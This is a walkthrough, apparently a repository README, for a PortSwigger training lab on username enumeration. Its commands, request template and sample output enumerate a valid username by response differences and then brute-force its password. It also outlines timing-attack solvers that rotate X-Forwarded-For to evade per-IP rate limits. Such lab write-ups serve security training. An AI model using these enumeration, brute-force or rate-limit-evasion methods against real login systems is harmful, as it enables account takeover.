# Walkthrough: Solving "Username enumeration via different responses"

End-to-end walkthrough of solving [this PortSwigger lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses) two ways: with the specialized `username_enum_solver.py`, and with the general-purpose `intruder.py`. Same outcome, different shape of tool.

> The lab is a deliberately vulnerable web app PortSwigger provides for free. Running these tools against it is the intended use.

---

## Setup (one-time)

```bash
git clone https://github.com/cyberprophetTV/portswigger-lab-tools.git
cd portswigger-lab-tools
pip install requests          # only hard dep
pip install tqdm              # optional, for the progress bar
```

The candidate `usernames.txt` and `passwords.txt` are checked into the repo. They're the standard lists [PortSwigger publishes](https://portswigger.net/web-security/authentication/auth-lab-usernames) for these labs (101 + 100 entries respectively).

---

## Step 1 — Spin up the lab

1. Open https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses (sign in to your free account if you haven't).
2. Click **"Access the lab"**. PortSwigger provisions a fresh disposable container; you'll land at a URL like:
   ```
   https://0a1b00abc.web-security-academy.net/
   ```
3. **Copy that URL.** Keep the browser tab open — if you don't interact with the lab for ~20 minutes, the container is recycled and you'll start getting `504 Gateway Timeout` from the script.

> If the script reports `[-] no outlier found - every response looked identical.` with samples that show `(504, 197, '')`, your container has expired. Click "Access the lab" again to get a fresh one.

---

## Step 2 — Run the specialized solver

```bash
python3 username_enum_solver.py \
    https://YOUR-LAB-ID.web-security-academy.net \
    usernames.txt passwords.txt
```

Expected output:

```
[*] phase 1: probing 101 usernames with 10 workers
[+] valid username: 'carlos'
    outlier  : status=200 len=3170 msg='Incorrect password'
    baseline : status=200 len=3168 msg='Invalid username'
[*] phase 2: trying 100 passwords against 'carlos'
[+] password found: 'qwerty'  -> redirect to '/my-account'

=== credentials: carlos:qwerty ===
```

(`[+]` is rendered in green if your terminal supports color.)

### What's happening under the hood

**Phase 1 — fingerprint every candidate username.** The solver sends 101 `POST /login` requests in parallel, one per candidate, all with a deliberately wrong password. For each response it records a *fingerprint* — a tuple of `(status_code, body_length, error_message)`. Most responses come back with `(200, 3168, "Invalid username")`. **Exactly one** comes back different: `(200, 3170, "Incorrect password")`. That's the outlier — the server is telling us "that username exists, you just got the password wrong." The valid username is whichever candidate produced that unique fingerprint.

**Phase 2 — brute-force the password for the discovered username.** Same parallel pattern: 100 requests, each `POST /login` with `username=carlos` and one candidate password. Failed attempts return HTTP 200 (with an error page). The successful one returns HTTP 302 with `Location: /my-account` — the redirect-to-account that happens after a successful login. The solver stops as soon as it sees the 302 instead of waiting for the rest of the workers to finish.

**Total time on a healthy network connection: 2–4 seconds for both phases combined.** Compare to Burp Community Intruder, which would take roughly 8–10 minutes for the same work because of its built-in throttle.

### Verify the credentials manually

In the browser tab where you opened the lab, click "My account" (top right), then log in with `carlos` / `qwerty` (or whatever credentials the script printed). The lab status banner at the top flips to "Solved". Done.

---

## Step 3 — Same lab, different tool: `intruder.py`

The specialized solver works great for this one lab, but it has the lab's structure (the field names, the success signal, the URL path) hardcoded. `intruder.py` is the general-purpose alternative — you express the lab as a *request template*, and the same engine handles any "iterate value X into position Y" attack.

### 3a — Create the request template

Save this as `req.txt` (replace the Host header with your lab ID):

```
POST /login HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=§USER§&password=junk
```

The `§USER§` markers tell the fuzzer "swap a payload in here". The text between the `§` symbols (`USER`) is just a label — it could be anything.

### 3b — Phase 1 via intruder

```bash
python3 intruder.py req.txt \
    --payload usernames.txt \
    --mode sniper \
    --match-length '!3168'
```

This runs in **sniper mode** with one payload set (the username list). For each candidate, it sends `POST /login` with `username=<candidate>&password=junk` and shows responses whose body length **isn't** 3168 — the lone outlier.

Expected output (only the matching response prints):

```
[*] target  : https://YOUR-LAB-ID.web-security-academy.net
[*] markers : 1 in template
[*] payloads: [101]
[*] mode    : sniper
[*] queued  : 101 requests
[HIT] sniper pos=0 value='carlos'  status=200 len=3170 time=0.18s
```

Now you know `carlos` is valid. On to the password.

### 3c — Phase 2 via intruder (using cluster-bomb)

Update `req.txt` to mark the password too:

```
POST /login HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=§USER§&password=§PW§
```

Then:

```bash
python3 intruder.py req.txt \
    --payload <(echo carlos) \
    --payload passwords.txt \
    --mode cluster-bomb \
    --match-status 302
```

Cluster-bomb mode generates the cartesian product of the two payload lists (1 × 100 = 100 requests), and `--match-status 302` filters to just the successful redirect. The `<(echo carlos)` trick uses bash process substitution to inline a one-line wordlist.

Expected:

```
[HIT] cluster ('carlos', 'qwerty')  status=302 len=0 time=0.16s
```

Same credentials, expressed entirely through the generic fuzzer.

---

## Step 4 — Route both runs through Burp for observability

Even though you're bypassing Intruder's throttle, you may still want Burp recording the requests — for replay, deeper analysis, or future Repeater work. Open Burp Suite (Community is fine), confirm the listener is on at `127.0.0.1:8080` (Proxy → Proxy settings), turn Intercept **off**, then add `--proxy burp` to either command:

```bash
python3 username_enum_solver.py \
    https://YOUR-LAB-ID.web-security-academy.net \
    usernames.txt passwords.txt \
    --proxy burp
```

Every request the script sends shows up in Burp's **HTTP History** tab. The `--proxy burp` shorthand auto-disables TLS verification (`--insecure`) because Burp MITMs HTTPS with its own CA — see the `build_session` docstring for the proper-trust-installation alternative.

---

## Step 5 — Try the harder labs

The same repo includes solvers for two related labs that use subtler signal channels:

### Subtly different responses

```bash
python3 subtle_response_solver.py \
    https://YOUR-LAB-ID.web-security-academy.net \
    usernames.txt passwords.txt
```

For the lab where invalid and valid responses differ by only ~1 character (e.g. a trailing period). Naive length fingerprinting fails because dynamic content (CSRF tokens) also wobbles the byte count. The solver fetches a baseline using a random UUID as a "definitely-invalid" username, canonicalizes both bodies to strip the dynamic noise, then uses `difflib.SequenceMatcher` to find the candidate whose response is least similar to baseline.

### Response timing

```bash
python3 timing_attack_solver.py \
    https://YOUR-LAB-ID.web-security-academy.net \
    usernames.txt passwords.txt
```

For the lab where the bodies are identical but valid usernames take ~100 ms longer (the server runs `bcrypt` on a real hash, while invalid usernames short-circuit). Solver sends a long junk password (1000 chars) to amplify the time delta, samples each candidate 3 times to filter noise, ranks by mean response time, and reports the outlier via z-score. Rotates `X-Forwarded-For` per request to bypass the lab's per-IP rate limiter.

---

## Where to go next

- **More auth labs.** The PortSwigger auth section has 8 more labs (broken brute-force protection, 2FA bypasses, OAuth flaws, etc.). With `intruder.py` as the engine, most are one request template + a wordlist away.
- **Other vulnerability classes.** Point `intruder.py` at any input position: SQLi, XSS, path traversal, IDOR, SSRF. The matchers (`--match-status`, `--match-length`, `--match-regex`) give you the response-side filter.
- **Read the source.** Each script's docstring walks through the technique it implements. `intruder.py` is the best place to start if you want to internalize how Burp Intruder works.
